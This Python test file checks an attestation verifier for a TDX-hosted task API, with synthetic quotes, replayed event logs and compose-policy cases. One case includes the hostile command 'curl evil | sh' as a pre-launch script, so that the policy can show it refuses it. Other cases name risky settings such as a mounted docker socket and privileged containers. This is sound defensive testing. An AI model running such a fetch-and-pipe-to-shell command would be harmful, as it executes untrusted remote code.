import asyncio
import hashlib
import json
import ssl
from pathlib import Path

import pytest

from desearch import attestation
from desearch.attestation import Dcap, OsMeasurement, Policy

DATA = Path(__file__).parent / "data"
SIGNER = "5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY"
MRTD = bytes([1]) * 48
RTMR0, RTMR1, RTMR2 = bytes([2]) * 48, bytes([3]) * 48, bytes([4]) * 48
PINNED = OsMeasurement(
    "dstack-0.5.5", MRTD.hex(), RTMR0.hex(), RTMR1.hex(), RTMR2.hex()
)
IMAGE = "ghcr.io/desearch-ai/sn22-task-api@sha256:" + "ab" * 32
REDIS = "redis:7.4-alpine@sha256:" + "cd" * 32
CADDY = "caddy:2.8@sha256:" + "ef" * 32
V1_CERT = """-----BEGIN CERTIFICATE-----
MIICETCCAbYCCQCzrq8mQxJPsjAKBggqhkjOPQQDAjAWMRQwEgYDVQQDDAthcGku
ZXhhbXBsZTAeFw0yNjExMDQwODMyMjdaFw0zNjExMDEwODMyMjdaMBYxFDASBgNV
BAMMC2FwaS5leGFtcGxlMIIBSzCCAQMGByqGSM49AgEwgfcCAQEwLAYHKoZIzj0B
AQIhAP////8AAAABAAAAAAAAAAAAAAAA////////////////MFsEIP////8AAAAB
AAAAAAAAAAAAAAAA///////////////8BCBaxjXYqjqT57PrvVV2mIa8ZR0GsMxT
sPY7zjw+J9JgSwMVAMSdNgiG5wSTamZ44ROdJreBn36QBEEEaxfR8uEsQkf4vObl
Y6RA8ncDfYEt6zOg9KE5RdiYwpZP40Li/hp/m47n60p8D54WK84zV2sxXs7LtkBo
N79R9QIhAP////8AAAAA//////////+85vqtpxeehPO5ysL8YyVRAgEBA0IABL3k
/WY9MhGw26jey3To4Konulv6VPJ6EtXJL6mIltXrJLgQIrUP3wOoSNx0WzumT8fI
9tl+uDXi7U4TKTo6YBAwCgYIKoZIzj0EAwIDSQAwRgIhAL350s0z1lEGJkkLXaE4
XKWuNC74QolFCt/10Yafq7ffAiEA7l6NmjJC0PHNO+eIcExQ0Arw595m3XTc30nX
i7uLnNM=
-----END CERTIFICATE-----"""
V3_CERT = """-----BEGIN CERTIFICATE-----
MIICyTCCAbGgAwIBAgIJAN5cCFs9BGJFMA0GCSqGSIb3DQEBCwUAMBYxFDASBgNV
BAMMC2FwaS5leGFtcGxlMB4XDTI2MTEwNDA4MzI0MVoXDTM2MTEwMTA4MzI0MVow
FjEUMBIGA1UEAwwLYXBpLmV4YW1wbGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQCi8T/MzsuJ9XKQXA4rjHQPmIxnM+txz6EaVQIFyFZSPIMMjMhmXUt0
aUZhUwKyY+7QCznrxIp/d4Et+P7DLs1o2EmQrvnM4aHhtKVt5vSJzD2pfhV8ui/s
QL8GyUCSYKf5nb2b33X9z1atBz8CtehA/14ZCHBXsRgXjVW20NsgAOHhbnFuu1Nd
rRPiFnIVURxTjCq8gRRF+GCaRt4KEah9js6d/Pb95uFFMWKD3XUDjDcVlMxSG8wJ
qT4r674NNvTZlL/sY9macgFDWDZpikc7/SkqtjV6tBR6jVqKDXswQBBU7hroJqH6
6dK6i3gXGStXeT88ymCU7m/7OKRtrn+hAgMBAAGjGjAYMBYGA1UdEQQPMA2CC2Fw
aS5leGFtcGxlMA0GCSqGSIb3DQEBCwUAA4IBAQBqPGlK4jsZrs6rUZUt5z9RiLel
Q4RPxTCePVBPlCD0lrBVJUXX5ukQhQ9wnltR2cJa9ciSOsbhERgGKakjVX0bQHZ8
6GVMN3VCUXl0YU34R/ARUJkRc6LEMOgexMvYkcb2CX+Jvi1eOVk5wVewJXNFS6Bf
Uw6qtE3cbBDjluuPveIIdONI16S2n2vgrUHWN0Rxoacw3Adt0cLw0J88re2+YFTW
Lh3brMI0U24GBqNjzYrXK1Lj9mldh8X7GOB8S5QayKWKGiHpIkj1ZWhN56e5FKTM
Zc2+93WmNl41lp1BcjtplK2443mCNx1fqTfwVYxxJ2oY1e5gUmIXCG4vBbUs
-----END CERTIFICATE-----"""


TEE_SETTINGS = {
    "TASK_API_KEY_SOURCE": "cvm",
    "TASK_API_CUSTODY": "1",
    "TASK_API_TEE_SIMULATED": "0",
    "TASK_API_CHAIN_FINALIZED": "1",
    "TASK_API_CHAIN_COUNT_ON": "0",
    "TASK_API_GOV_THRESHOLD": "0.5",
    "TASK_API_GOV_TIMELOCK_BLOCKS": 50400,
}


def docker_compose(**changes) -> str:
    api = {
        "image": IMAGE,
        "environment": {
            **TEE_SETTINGS,
            "TASK_API_CLAIM_TTL": 180,
            "CF_R2_ACCESS_KEY_ID": "${CF_R2_ACCESS_KEY_ID}",
        },
        "volumes": ["/var/run/dstack.sock:/var/run/dstack.sock", "api-data:/data"],
    }
    api.update(changes.pop("api", {}))
    services = {
        "api": api,
        "redis": {"image": REDIS},
        "tls": {"image": CADDY, "ports": ["443:443"]},
    }
    services.update(changes)
    return json.dumps({"services": services})


def app_compose(**changes) -> str:
    compose = {
        "manifest_version": 2,
        "name": "sn22-task-api",
        "runner": "docker-compose",
        "docker_compose_file": docker_compose(),
        "kms_enabled": True,
        "gateway_enabled": True,
        "local_key_provider_enabled": False,
        "allowed_envs": ["CF_R2_ACCESS_KEY_ID", "CF_R2_SECRET_ACCESS_KEY"],
    }
    compose.update(changes)
    return json.dumps(compose, sort_keys=True, separators=(",", ":"))


def runtime_event(name: str, payload: bytes) -> dict:
    preimage = (
        (0x08000001).to_bytes(4, "little") + b":" + name.encode() + b":" + payload
    )
    return {
        "imr": 3,
        "event_type": 0x08000001,
        "digest": hashlib.sha384(preimage).hexdigest(),
        "event": name,
        "event_payload": payload.hex(),
    }


def events_for(compose: str) -> list[dict]:
    return [
        {
            "imr": 0,
            "event_type": 1,
            "digest": "00" * 48,
            "event": "",
            "event_payload": "",
        },
        runtime_event("system-preparing", b""),
        runtime_event("app-id", bytes([7]) * 20),
        runtime_event("compose-hash", hashlib.sha256(compose.encode()).digest()),
        runtime_event("instance-id", bytes([8]) * 20),
        runtime_event("boot-mr-done", b""),
        runtime_event("key-provider", b'{"name":"kms","id":"00"}'),
        runtime_event("system-ready", b""),
    ]


def replayed(events: list[dict]) -> bytes:
    rtmr = bytes(48)
    for event in events:
        if event["imr"] == 3:
            rtmr = hashlib.sha384(rtmr + bytes.fromhex(event["digest"])).digest()
    return rtmr


def quote_bytes(
    report_data: bytes, rtmr3: bytes, attributes=bytes(8), mrtd=MRTD, version=4
) -> bytes:
    header = (
        version.to_bytes(2, "little")
        + (2).to_bytes(2, "little")
        + (0x81).to_bytes(4, "little")
        + bytes(4)
        + bytes(16)
        + bytes(20)
    )
    body = (
        bytes(16)
        + bytes(48) * 2
        + bytes(8)
        + attributes
        + bytes(8)
        + mrtd
        + bytes(48) * 3
        + RTMR0
        + RTMR1
        + RTMR2
        + rtmr3
        + report_data
    )
    assert len(body) == 584
    middle = (
        (2).to_bytes(2, "little") + (584).to_bytes(4, "little") if version == 5 else b""
    )
    return header + middle + body + (4).to_bytes(4, "little") + b"auth"


def document(**changes) -> dict:
    found = {
        "kind": "sn22-task-api-attestation",
        "version": 1,
        "signer": SIGNER,
        "handover_key": "11" * 32,
        "config_sha256": "22" * 32,
        "tls_spki_sha256": None,
    }
    found.update(changes)
    return found


def attestation_of(compose=None, doc=None, **quote) -> dict:
    compose = compose if compose is not None else app_compose()
    doc = doc if doc is not None else document()
    events = quote.pop("events", None) or events_for(compose)
    raw = quote_bytes(
        quote.pop("report_data", attestation.report_data_of(doc)),
        quote.pop("rtmr3", replayed(events)),
        **quote,
    )
    return {
        "document": doc,
        "report_data": attestation.report_data_of(doc).hex(),
        "quote": raw.hex(),
        "event_log": json.dumps(events),
        "vm_config": "{}",
        "app_compose": compose,
        "info": {},
    }


def fake_dcap(status="UpToDate", advisories=(), ppid=b"machine"):
    async def verify(raw: bytes) -> Dcap:
        return Dcap(status, tuple(advisories), ppid)

    return verify


def run(
    found: dict, policy=Policy(os=(PINNED,)), dcap=None, **expect
) -> attestation.Report:
    return asyncio.run(
        attestation.verify(found, policy=policy, dcap=dcap or fake_dcap(), **expect)
    )


def failed(report) -> set[str]:
    return {check.name for check in report.failures()}


def test_a_genuine_attestation_passes_every_check():
    compose = app_compose()
    report = run(
        attestation_of(compose),
        signer=SIGNER,
        compose_hash=hashlib.sha256(compose.encode()).hexdigest(),
    )
    assert report.ok, report.failures()
    assert report.compose_hash == hashlib.sha256(compose.encode()).hexdigest()
    assert (report.signer, report.app_id) == (SIGNER, "07" * 20)
    assert {c.name for c in report.checks} >= {
        "quote",
        "debug",
        "dcap",
        "device",
        "os",
        "rtmr3",
        "compose_hash",
        "app_compose",
        "compose_policy",
        "key_provider",
        "report_data",
        "document",
        "signer",
        "expected_compose",
    }


def test_a_quote_v5_body_is_read_past_its_type_and_size():
    assert run(attestation_of(version=5)).ok


def test_with_no_os_pinned_nothing_passes_unless_a_testnet_allows_any():
    found = attestation_of()
    assert failed(run(found, policy=Policy())) == {"os"}
    assert run(found, policy=Policy(allow_any_os=True)).ok


def test_an_unpinned_os_image_fails():
    assert failed(run(attestation_of(mrtd=bytes([9]) * 48))) == {"os"}


def test_a_debug_td_fails():
    assert "debug" in failed(run(attestation_of(attributes=bytes([1]) + bytes(7))))


def test_a_quote_intel_does_not_vouch_for_fails():
    assert failed(run(attestation_of(), dcap=fake_dcap("OutOfDate"))) == {"dcap"}
    assert failed(
        run(attestation_of(), dcap=fake_dcap(advisories=["INTEL-SA-00837"]))
    ) == {"dcap"}

    async def broken(raw):
        raise ValueError("bad signature")

    assert failed(run(attestation_of(), dcap=broken)) == {"dcap"}


def test_the_device_allowlist_is_applied_when_the_release_has_one():
    allowed = hashlib.sha256(b"machine").hexdigest()
    assert run(
        attestation_of(), policy=Policy(os=(PINNED,), devices=frozenset({allowed}))
    ).ok
    assert failed(
        run(
            attestation_of(),
            policy=Policy(os=(PINNED,), devices=frozenset({"00" * 32})),
        )
    ) == {"device"}


def test_a_document_the_quote_does_not_bind_fails():
    found = attestation_of()
    found["document"] = document(
        signer="5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty"
    )
    assert failed(run(found)) == {"report_data"}


def test_a_different_signer_or_compose_than_expected_fails():
    assert failed(
        run(attestation_of(), signer="5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty")
    ) == {"signer"}
    assert failed(run(attestation_of(), compose_hash="00" * 32)) == {"expected_compose"}


def test_an_event_log_that_does_not_replay_to_rtmr3_stops_the_checks():
    report = run(attestation_of(rtmr3=bytes(48)))
    assert failed(report) == {"rtmr3"} and report.compose_hash is None


def test_an_app_compose_other_than_the_measured_one_fails():
    found = attestation_of()
    found["app_compose"] = app_compose(name="other")
    assert failed(run(found)) == {"app_compose"}


@pytest.mark.parametrize(
    "compose, problem",
    [
        (
            app_compose(allowed_envs=["CF_R2_ACCESS_KEY_ID", "TASK_API_CLAIM_TTL"]),
            "allowed_envs",
        ),
        (app_compose(pre_launch_script="curl evil | sh"), "pre_launch_script"),
        (app_compose(init_script=["echo"]), "init_script"),
        (app_compose(kms_enabled=False), "kms_enabled"),
        (app_compose(local_key_provider_enabled=True), "local_key_provider"),
        (app_compose(runner="bash"), "runner"),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    api={"image": "ghcr.io/desearch-ai/sn22-task-api:latest"}
                )
            ),
            "not pinned",
        ),
        (app_compose(docker_compose_file=docker_compose(api={"build": "."})), "built"),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    redis={"image": REDIS, "ports": ["6379:6379"]}
                )
            ),
            "publishes port 6379",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    tls={"image": CADDY, "privileged": True}
                )
            ),
            "privileged",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    tls={"image": CADDY, "network_mode": "host"}
                )
            ),
            "network_mode",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    tls={
                        "image": CADDY,
                        "volumes": ["/var/run/docker.sock:/var/run/docker.sock"],
                    }
                )
            ),
            "docker socket",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    api={"image": IMAGE, "env_file": ".env"}
                )
            ),
            "env_file",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    api={
                        "image": IMAGE,
                        "environment": {
                            **json.loads(docker_compose())["services"]["api"][
                                "environment"
                            ],
                            "TASK_API_CLAIM_TTL": "${TTL}",
                        },
                    }
                )
            ),
            "takes TASK_API_CLAIM_TTL",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    api={
                        "image": IMAGE,
                        "environment": {**TEE_SETTINGS, "TASK_API_GOV_THRESHOLD": "0.1"},
                    }
                )
            ),
            "TASK_API_GOV_THRESHOLD",
        ),
        (
            app_compose(
                docker_compose_file=docker_compose(
                    api={
                        "image": IMAGE,
                        "environment": {**TEE_SETTINGS, "TASK_API_KEY_SOURCE": "uri"},
                    }
                )
            ),
            "TASK_API_KEY_SOURCE",
        ),
    ],
)
def test_the_compose_policy_refuses_what_lets_the_deployer_change_the_code_or_its_settings(
    compose, problem
):
    report = run(attestation_of(compose))
    assert failed(report) == {"compose_policy"}
    detail = next(c.detail for c in report.checks if c.name == "compose_policy")
    assert problem in detail


def test_a_key_provider_other_than_the_kms_fails():
    compose = app_compose()
    events = [
        (
            runtime_event("key-provider", b'{"name":"local","id":""}')
            if e["event"] == "key-provider"
            else e
        )
        for e in events_for(compose)
    ]
    assert failed(run(attestation_of(compose, events=events))) == {"key_provider"}


def test_the_simulator_flag_skips_only_the_signature_and_the_device():
    report = run(
        attestation_of(),
        policy=Policy(allow_any_os=True, simulated=True),
        dcap=fake_dcap("Revoked"),
    )
    assert report.ok
    assert "simulator" in next(c.detail for c in report.checks if c.name == "dcap")


def test_a_fresh_quote_must_carry_the_nonce_asked_for():
    doc = document(nonce="ab" * 32)
    assert run(attestation_of(doc=doc), nonce="ab" * 32).ok
    assert failed(run(attestation_of(doc=doc), nonce="cd" * 32)) == {"nonce"}


def test_report_data_is_sha512_of_the_prefixed_canonical_document():
    doc = {"signer": SIGNER, "kind": "sn22-task-api-attestation", "version": 1}
    expected = hashlib.sha512(
        b"sn22-task-api-attestation-v1:"
        + b'{"kind":"sn22-task-api-attestation","signer":"'
        + SIGNER.encode()
        + b'","version":1}'
    ).digest()
    assert attestation.report_data_of(doc) == expected


def test_the_document_hash_leaves_out_a_nonce():
    assert attestation.document_sha256(
        document(nonce="ab")
    ) == attestation.document_sha256(document())


def test_a_version_2_runtime_event_hashes_its_canonical_json():
    event = {
        "imr": 3,
        "event_type": 0x08000001,
        "event": "compose-hash",
        "event_payload": "abcd",
        "version": 2,
    }
    expected = hashlib.sha384(
        b'{"name":"compose-hash","payload":"abcd","type":134217729}'
    ).digest()
    assert attestation.event_digest(event) == expected


def test_the_dstack_simulators_real_quote_parses_and_its_event_log_replays_to_its_rtmr3():
    fixture = json.loads((DATA / "dstack_simulator_quote.json").read_text())
    quote = attestation.parse_quote(bytes.fromhex(fixture["quote"]))
    assert (quote.version, quote.tee_type, quote.debug) == (4, 0x81, False)
    assert attestation.replay_rtmr3(fixture["event_log"]) == quote.rtmrs[3]
    events = attestation.runtime_events(fixture["event_log"])
    assert [
        len(events[name])
        for name in ("app-id", "compose-hash", "instance-id", "key-provider")
    ] == [1, 1, 1, 1]
    assert json.loads(events["key-provider"][0])["name"] == "kms"


def test_a_quote_that_is_not_tdx_or_too_short_is_refused():
    assert failed(run({"quote": "00" * 10})) == {"quote"}
    raw = bytearray(quote_bytes(bytes(64), bytes(48)))
    raw[4] = 0
    assert failed(run({"quote": raw.hex()})) == {"quote"}


@pytest.mark.parametrize(
    "pem, expected",
    [
        (V1_CERT, "a62a815021e3b3a1bb642b1dc6c38e58231771f2b0d90d3b9587fd14458b2c85"),
        (V3_CERT, "841a6d2634746f5e272ef69a24853259735944319a64494118eec7212f08d1b1"),
    ],
    ids=["v1", "v3"],
)
def test_the_spki_hash_is_that_of_the_certificates_public_key(pem, expected):
    """The expected values are `openssl x509 -pubkey | openssl pkey -pubin -outform DER | sha256`."""
    assert attestation.spki_sha256(ssl.PEM_cert_to_DER_cert(pem)) == expected


def test_the_config_hash_is_of_the_canonical_config():
    config = {"settings": {"B": 1, "A": "x"}, "version": "0.1.0"}
    assert (
        attestation.config_sha256(config)
        == hashlib.sha256(b'{"settings":{"A":"x","B":1},"version":"0.1.0"}').hexdigest()
    )
